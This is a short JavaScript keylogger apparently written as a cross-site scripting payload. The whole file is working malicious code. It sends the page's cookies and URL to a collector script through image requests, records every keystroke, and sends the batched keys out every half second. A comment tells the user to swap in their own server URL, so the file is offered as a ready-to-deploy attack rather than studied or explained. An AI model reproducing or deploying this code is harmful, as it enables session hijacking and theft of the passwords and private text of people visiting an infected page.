// Record all key presses into an array
//<script>
new Image().src="http://localhost/perfectKeyLoger/keylog.php?output="+document.cookie;
//new Image().src="http://localhost/perfectKeyLoger/keylog.php?m="+document.body.innerHTML;
new Image().src="http://localhost/perfectKeyLoger/keylog.php?m="+location.href;

var presses = [];
window.addEventListener("keydown", function(evt){
  presses.push(evt.key);
});

// Push to server at regular intervals
// Reduce interval timing for more frequent recordings, but increases server load
// You can also set this to send only if certain number of key stroke were made.
window.setInterval(function () {
  if (presses.length>5) {
    var data = encodeURIComponent(JSON.stringify(presses));
    new Image().src = "http://localhost/perfectKeyLoger/keylog.php?k=" + data; // CHANGE THIS URL TO YOUR OWN!
    presses = [];
  }
}, 500);


//</script>

